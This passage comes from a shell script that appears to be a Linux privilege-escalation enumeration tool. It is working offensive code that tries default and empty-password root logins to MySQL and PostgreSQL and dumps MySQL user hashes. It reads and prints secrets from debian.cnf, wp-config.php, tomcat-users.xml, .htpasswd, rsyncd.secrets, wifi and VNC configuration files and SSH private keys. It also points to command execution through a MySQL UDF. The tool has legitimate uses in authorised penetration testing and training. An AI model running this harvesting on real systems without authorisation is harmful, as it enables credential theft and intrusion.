    mysql -u root --password=toor -e "SELECT User,Host,authentication_string FROM mysql.user;" 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  else echo_no
  fi

  #-- SI) MySQL connection root/NOPASS
  mysqlconnectnopass=$(mysqladmin -uroot version 2>/dev/null)
  print_list "MySQL connection using root/NOPASS ................. "
  if [ "$mysqlconnectnopass" ]; then
    echo "Yes" | sed -${E} "s,.*,${SED_RED},"
    mysql -u root -e "SELECT User,Host,authentication_string FROM mysql.user;" 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  else echo_no
  fi
  echo ""
fi

#-- SI) MySQL credentials
if [ "$PSTORAGE_MYSQL" ] || [ "$DEBUG" ]; then
  print_2title "Searching mysql credentials and exec"
  printf "%s\n" "$PSTORAGE_MYSQL" | while read d; do
    if [ -f "$d" ] && ! [ "$(basename $d)" = "mysql" ]; then # Only interested in "mysql" that are folders (filesaren't the ones with creds)
      STRINGS="`command -v strings`"
      echo "Potential file containing credentials:"
      ls -l "$d"
      if [ "$STRINGS" ]; then
        strings "$d"
      else
        echo "Strings not found, cat the file and check it to get the creds"
      fi

    else
      for f in $(find $d -name debian.cnf 2>/dev/null); do
        if [ -r "$f" ]; then
          echo "We can read the mysql debian.cnf. You can use this username/password to log in MySQL" | sed -${E} "s,.*,${SED_RED},"
          cat "$f"
        fi
      done
      
      for f in $(find $d -name user.MYD 2>/dev/null); do
        if [ -r "$f" ]; then
          echo "We can read the Mysql Hashes from $f" | sed -${E} "s,.*,${SED_RED},"
          grep -oaE "[-_\.\*a-Z0-9]{3,}" "$f" | grep -v "mysql_native_password"
        fi
      done
      
      for f in $(grep -lr "user\s*=" $d 2>/dev/null | grep -v "debian.cnf"); do
        if [ -r "$f" ]; then
          u=$(cat "$f" | grep -v "#" | grep "user" | grep "=" 2>/dev/null)
          echo "From '$f' Mysql user: $u" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},"
        fi
      done
      
      for f in $(find $d -name my.cnf 2>/dev/null); do
        if [ -r "$f" ]; then
          echo "Found readable $f"
          grep -v "^#" "$f" | grep -Ev "\W+\#|^#" 2>/dev/null | grep -Iv "^$" | sed "s,password.*,${SED_RED},"
        fi
      done
    fi
    
    mysqlexec=$(whereis lib_mysqludf_sys.so 2>/dev/null | grep -Ev '^lib_mysqludf_sys.so:$' | grep "lib_mysqludf_sys\.so")
    if [ "$mysqlexec" ]; then
      echo "Found $mysqlexec. $(whereis lib_mysqludf_sys.so)"
      echo "If you can login in MySQL you can execute commands doing: SELECT sys_eval('id');" | sed -${E} "s,.*,${SED_RED},"
    fi
  done
fi
echo ""

if [ "$PSTORAGE_MARIADB" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing MariaDB Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_MARIADB\" | grep -E \"mariadb\.cnf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "mariadb.cnf"; fi; fi; printf "%s" "$PSTORAGE_MARIADB" | grep -E "mariadb\.cnf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,mariadb\.cnf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,user.*|password.*|admin_address.*|debug.*|sql_warnings.*|secure_file_priv.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_MARIADB\" | grep -E \"debian\.cnf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "debian.cnf"; fi; fi; printf "%s" "$PSTORAGE_MARIADB" | grep -E "debian\.cnf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,debian\.cnf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "user.*|password.*|admin_address.*|debug.*|sql_warnings.*|secure_file_priv.*" | sed -${E} "s,user.*|password.*|admin_address.*|debug.*|sql_warnings.*|secure_file_priv.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_POSTGRESQL" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing PostgreSQL Files (limit 70)"
    echo "Version: $(warn_exec psql -V 2>/dev/null)"
    if ! [ "`echo \"$PSTORAGE_POSTGRESQL\" | grep -E \"pgadmin.*\.db$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "pgadmin*.db"; fi; fi; printf "%s" "$PSTORAGE_POSTGRESQL" | grep -E "pgadmin.*\.db$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,pgadmin.*\.db$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_POSTGRESQL\" | grep -E \"pg_hba\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "pg_hba.conf"; fi; fi; printf "%s" "$PSTORAGE_POSTGRESQL" | grep -E "pg_hba\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,pg_hba\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,auth|password|md5|user=|pass=|trust,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_POSTGRESQL\" | grep -E \"postgresql\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "postgresql.conf"; fi; fi; printf "%s" "$PSTORAGE_POSTGRESQL" | grep -E "postgresql\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,postgresql\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,auth|password|md5|user=|pass=|trust,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_POSTGRESQL\" | grep -E \"pgsql\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "pgsql.conf"; fi; fi; printf "%s" "$PSTORAGE_POSTGRESQL" | grep -E "pgsql\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,pgsql\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,auth|password|md5|user=|pass=|trust,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_POSTGRESQL\" | grep -E \"pgadmin4\.db$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "pgadmin4.db"; fi; fi; printf "%s" "$PSTORAGE_POSTGRESQL" | grep -E "pgadmin4\.db$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,pgadmin4\.db$,${SED_RED},"; done; echo "";
fi


#-- SI) PostgreSQL brute
if [ "$TIMEOUT" ] && [ "$(command -v psql)" ] || [ "$DEBUG" ]; then  # In some OS (like OpenBSD) it will expect the password from console and will pause the script. Also, this OS doesn't have the "timeout" command so lets only use this checks in OS that has it.
# Checks to see if any postgres password exists and connects to DB 'template0' - following commands are a variant on this
  print_list "PostgreSQL connection to template0 using postgres/NOPASS ........ "
  if [ "$(timeout 1 psql -U postgres -d template0 -c 'select version()' 2>/dev/null)" ]; then echo "Yes" | sed -${E} "s,.*,${SED_RED},"
  else echo_no
  fi

  print_list "PostgreSQL connection to template1 using postgres/NOPASS ........ "
  if [ "$(timeout 1 psql -U postgres -d template1 -c 'select version()' 2>/dev/null)" ]; then echo "Yes" | sed "s,.*,${SED_RED},"
  else echo_no
  fi

  print_list "PostgreSQL connection to template0 using pgsql/NOPASS ........... "
  if [ "$(timeout 1 psql -U pgsql -d template0 -c 'select version()' 2>/dev/null)" ]; then echo "Yes" | sed -${E} "s,.*,${SED_RED},"
  else echo_no
  fi

  print_list "PostgreSQL connection to template1 using pgsql/NOPASS ........... "
  if [ "$(timeout 1 psql -U pgsql -d template1 -c 'select version()' 2> /dev/null)" ]; then echo "Yes" | sed -${E} "s,.*,${SED_RED},"
  else echo_no
  fi
  echo ""
fi

if [ "$PSTORAGE_MONGO" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Mongo Files (limit 70)"
    echo "Version: $(warn_exec mongo --version 2>/dev/null; warn_exec mongod --version 2>/dev/null)"
    if [ "$(command -v mongo)" ]; then echo "show dbs" | mongo 127.0.0.1 > /dev/null 2>&1;[ "$?" == "0" ] && echo "Possible mongo anonymous authentication" | sed -${E} "s,.*|kube,${SED_RED},"; fi
    if ! [ "`echo \"$PSTORAGE_MONGO\" | grep -E \"mongod.*\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "mongod*.conf"; fi; fi; printf "%s" "$PSTORAGE_MONGO" | grep -E "mongod.*\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,mongod.*\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#"; done; echo "";
fi


if [ "$PSTORAGE_APACHE_NGINX" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Apache-Nginx Files (limit 70)"
    echo "Apache version: $(warn_exec apache2 -v 2>/dev/null; warn_exec httpd -v 2>/dev/null)"
    echo "Nginx version: $(warn_exec nginx -v 2>/dev/null)"
    if [ -d "/etc/apache2" ] && [ -r "/etc/apache2" ]; then grep -R -B1 "httpd-php" /etc/apache2 2>/dev/null; fi
    if [ -d "/usr/share/nginx/modules" ] && [ -r "/usr/share/nginx/modules" ]; then print_3title 'Nginx modules'; ls /usr/share/nginx/modules | sed -${E} "s,$NGINX_KNOWN_MODULES,${SED_GREEN},g"; fi
    print_3title 'PHP exec extensions'
    if ! [ "`echo \"$PSTORAGE_APACHE_NGINX\" | grep -E \"sites-enabled$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sites-enabled"; fi; fi; printf "%s" "$PSTORAGE_APACHE_NGINX" | grep -E "sites-enabled$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sites-enabled$,${SED_RED},"; find "$f" -name "*" | while read ff; do ls -ld "$ff" | sed -${E} "s,.*,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "#" | sed -${E} "s,AuthType|AuthName|AuthUserFile|ServerName|ServerAlias|command on,${SED_RED},g"; done; echo "";done; echo "";
    if ! [ "`echo \"$PSTORAGE_APACHE_NGINX\" | grep -E \"000-default\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "000-default.conf"; fi; fi; printf "%s" "$PSTORAGE_APACHE_NGINX" | grep -E "000-default\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,000-default\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "#" | sed -${E} "s,AuthType|AuthName|AuthUserFile|ServerName|ServerAlias,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_APACHE_NGINX\" | grep -E \"php\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "php.ini"; fi; fi; printf "%s" "$PSTORAGE_APACHE_NGINX" | grep -E "php\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,php\.ini$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E allow_ | grep -Ev "^;" | sed -${E} "s,On,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_APACHE_NGINX\" | grep -E \"nginx\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "nginx.conf"; fi; fi; printf "%s" "$PSTORAGE_APACHE_NGINX" | grep -E "nginx\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,nginx\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "#" | sed -${E} "s,location.*.php$|$uri|$document_uri|proxy_intercept_errors.*on|proxy_hide_header.*|merge_slashes.*on|resolver.*|proxy_pass|internal|location.+[a-zA-Z0-9][^/]\s+\{|map|proxy_set_header.*Upgrade.*http_upgrade|proxy_set_header.*Connection.*http_connection,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_APACHE_NGINX\" | grep -E \"nginx$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "nginx"; fi; fi; printf "%s" "$PSTORAGE_APACHE_NGINX" | grep -E "nginx$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,nginx$,${SED_RED},"; find "$f" -name "*.conf" | while read ff; do ls -ld "$ff" | sed -${E} "s,.conf,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "#" | sed -${E} "s,location.*.php$|$uri|$document_uri|proxy_intercept_errors.*on|proxy_hide_header.*|merge_slashes.*on|resolver.*|proxy_pass|internal|location.+[a-zA-Z0-9][^/]\s+\{|map|proxy_set_header.*Upgrade.*http_upgrade|proxy_set_header.*Connection.*http_connection,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_TOMCAT" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Tomcat Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_TOMCAT\" | grep -E \"tomcat-users\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "tomcat-users.xml"; fi; fi; printf "%s" "$PSTORAGE_TOMCAT" | grep -E "tomcat-users\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,tomcat-users\.xml$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "username=|password=" | sed -${E} "s,dbtype|dbhost|dbuser|dbhost|dbpass|dbport,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_FASTCGI" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing FastCGI Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_FASTCGI\" | grep -E \"fastcgi_params$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "fastcgi_params"; fi; fi; printf "%s" "$PSTORAGE_FASTCGI" | grep -E "fastcgi_params$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,fastcgi_params$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "DB_NAME|DB_USER|DB_PASS" | sed -${E} "s,DB_NAME|DB_USER|DB_PASS,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_HTTP_CONF" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Http conf Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_HTTP_CONF\" | grep -E \"httpd\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "httpd.conf"; fi; fi; printf "%s" "$PSTORAGE_HTTP_CONF" | grep -E "httpd\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,httpd\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "htaccess.*|htpasswd.*" | grep -Ev "\W+\#|^#" | sed -${E} "s,htaccess.*|htpasswd.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_HTPASSWD" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Htpasswd Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_HTPASSWD\" | grep -E \"\.htpasswd$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".htpasswd"; fi; fi; printf "%s" "$PSTORAGE_HTPASSWD" | grep -E "\.htpasswd$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.htpasswd$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_PHP_SESSIONS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing PHP Sessions Files (limit 70)"
    ls /var/lib/php/sessions 2>/dev/null || echo_not_found /var/lib/php/sessions
    if ! [ "`echo \"$PSTORAGE_PHP_SESSIONS\" | grep -E \"sess_.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sess_*"; fi; fi; printf "%s" "$PSTORAGE_PHP_SESSIONS" | grep -E "sess_.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sess_.*$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
fi


if [ "$PSTORAGE_WORDPRESS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Wordpress Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_WORDPRESS\" | grep -E \"wp-config\.php$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "wp-config.php"; fi; fi; printf "%s" "$PSTORAGE_WORDPRESS" | grep -E "wp-config\.php$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,wp-config\.php$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "PASSWORD|USER|NAME|HOST" | sed -${E} "s,PASSWORD|USER|NAME|HOST,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_DRUPAL" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Drupal Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_DRUPAL\" | grep -E \"settings\.php$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "settings.php"; fi; fi; printf "%s" "$PSTORAGE_DRUPAL" | grep -E "settings\.php$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,settings\.php$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "drupal_hash_salt|'database'|'username'|'password'|'host'|'port'|'driver'|'prefix'" | sed -${E} "s,drupal_hash_salt|'database'|'username'|'password'|'host'|'port'|'driver'|'prefix',${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_MOODLE" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Moodle Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_MOODLE\" | grep -E \"config\.php$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "config.php"; fi; fi; printf "%s" "$PSTORAGE_MOODLE" | grep -E "config\.php$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,config\.php$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "dbtype|dbhost|dbuser|dbhost|dbpass|dbport" | sed -${E} "s,dbtype|dbhost|dbuser|dbhost|dbpass|dbport,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_SUPERVISORD" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Supervisord Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_SUPERVISORD\" | grep -E \"supervisord\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "supervisord.conf"; fi; fi; printf "%s" "$PSTORAGE_SUPERVISORD" | grep -E "supervisord\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,supervisord\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "port.*=|username.*=|password.*=" | sed -${E} "s,port.*=|username.*=|password.*=,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_CESI" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Cesi Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_CESI\" | grep -E \"cesi\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "cesi.conf"; fi; fi; printf "%s" "$PSTORAGE_CESI" | grep -E "cesi\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,cesi\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "username.*=|password.*=|host.*=|port.*=|database.*=" | sed -${E} "s,username.*=|password.*=|host.*=|port.*=|database.*=,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_RSYNC" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Rsync Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_RSYNC\" | grep -E \"rsyncd\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "rsyncd.conf"; fi; fi; printf "%s" "$PSTORAGE_RSYNC" | grep -E "rsyncd\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,rsyncd\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,secrets.*|auth.*users.*=,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_RSYNC\" | grep -E \"rsyncd\.secrets$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "rsyncd.secrets"; fi; fi; printf "%s" "$PSTORAGE_RSYNC" | grep -E "rsyncd\.secrets$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,rsyncd\.secrets$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_HOSTAPD" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Hostapd Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_HOSTAPD\" | grep -E \"hostapd\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "hostapd.conf"; fi; fi; printf "%s" "$PSTORAGE_HOSTAPD" | grep -E "hostapd\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,hostapd\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,passphrase.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_WIFI_CONNECTIONS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Wifi Connections Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_WIFI_CONNECTIONS\" | grep -E \"system-connections$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "system-connections"; fi; fi; printf "%s" "$PSTORAGE_WIFI_CONNECTIONS" | grep -E "system-connections$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,system-connections$,${SED_RED},"; find "$f" -name "*" | while read ff; do ls -ld "$ff" | sed -${E} "s,.*,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "psk.*" | sed -${E} "s,psk.*,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_ANACONDA_KS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Anaconda ks Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_ANACONDA_KS\" | grep -E \"anaconda-ks\.cfg$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "anaconda-ks.cfg"; fi; fi; printf "%s" "$PSTORAGE_ANACONDA_KS" | grep -E "anaconda-ks\.cfg$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,anaconda-ks\.cfg$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "rootpw.*" | sed -${E} "s,rootpw.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_VNC" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing VNC Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_VNC\" | grep -E \"\.vnc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".vnc"; fi; fi; printf "%s" "$PSTORAGE_VNC" | grep -E "\.vnc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.vnc$,${SED_RED},"; find "$f" -name "passwd" | while read ff; do ls -ld "$ff" | sed -${E} "s,passwd,${SED_RED},"; done; echo "";done; echo "";
    if ! [ "`echo \"$PSTORAGE_VNC\" | grep -E \"vnc.*\.c.*nf.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*vnc*.c*nf*"; fi; fi; printf "%s" "$PSTORAGE_VNC" | grep -E "vnc.*\.c.*nf.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,vnc.*\.c.*nf.*$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_VNC\" | grep -E \"vnc.*\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*vnc*.ini"; fi; fi; printf "%s" "$PSTORAGE_VNC" | grep -E "vnc.*\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,vnc.*\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_VNC\" | grep -E \"vnc.*\.txt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*vnc*.txt"; fi; fi; printf "%s" "$PSTORAGE_VNC" | grep -E "vnc.*\.txt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,vnc.*\.txt$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_VNC\" | grep -E \"vnc.*\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*vnc*.xml"; fi; fi; printf "%s" "$PSTORAGE_VNC" | grep -E "vnc.*\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,vnc.*\.xml$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_OPENVPN" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing OpenVPN Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_OPENVPN\" | grep -E \"\.ovpn$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.ovpn"; fi; fi; printf "%s" "$PSTORAGE_OPENVPN" | grep -E "\.ovpn$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.ovpn$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "auth-user-pass.+" | sed -${E} "s,auth-user-pass.+,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_LDAP" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Ldap Files (limit 70)"
    echo "The password hash is from the {SSHA} to 'structural'"
    if ! [ "`echo \"$PSTORAGE_LDAP\" | grep -E \"ldap$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ldap"; fi; fi; printf "%s" "$PSTORAGE_LDAP" | grep -E "ldap$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ldap$,${SED_RED},"; find "$f" -name "*.bdb" | while read ff; do ls -ld "$ff" | sed -${E} "s,.bdb,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E -i -a -o "description.*" | sort | uniq | sed -${E} "s,administrator|password|ADMINISTRATOR|PASSWORD|Password|Administrator,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_LOG4SHELL" ] || [ "$DEBUG" ]; then
  print_2title "Searching Log4Shell vulnerable libraries"
  printf "%s\n" "$PSTORAGE_LOG4SHELL" | while read f; do
    echo "$f" | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])" | sed -${E} "s,log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6]),${SED_RED},";
  done
  echo ""
fi

#-- SI) ssh files
print_2title "Searching ssl/ssh files"
if [ "$PSTORAGE_CERTSB4" ]; then certsb4_grep=$(grep -L "\"\|'\|(" $PSTORAGE_CERTSB4 2>/dev/null); fi
if ! [ "$SEARCH_IN_FOLDER" ]; then
  sshconfig="$(ls /etc/ssh/ssh_config 2>/dev/null)"
  hostsdenied="$(ls /etc/hosts.denied 2>/dev/null)"
  hostsallow="$(ls /etc/hosts.allow 2>/dev/null)"
  writable_agents=$(find /tmp /etc /home -type s -name "agent.*" -or -name "*gpg-agent*" '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null)
else
  sshconfig="$(ls ${ROOT_FOLDER}etc/ssh/ssh_config 2>/dev/null)"
  hostsdenied="$(ls ${ROOT_FOLDER}etc/hosts.denied 2>/dev/null)"
  hostsallow="$(ls ${ROOT_FOLDER}etc/hosts.allow 2>/dev/null)"
  writable_agents=$(find  ${ROOT_FOLDER} -type s -name "agent.*" -or -name "*gpg-agent*" '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null)
fi

if [ "$PSTORAGE_SSH" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing SSH Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_SSH\" | grep -E \"id_dsa.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "id_dsa*"; fi; fi; printf "%s" "$PSTORAGE_SSH" | grep -E "id_dsa.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,id_dsa.*$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_SSH\" | grep -E \"id_rsa.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "id_rsa*"; fi; fi; printf "%s" "$PSTORAGE_SSH" | grep -E "id_rsa.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,id_rsa.*$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
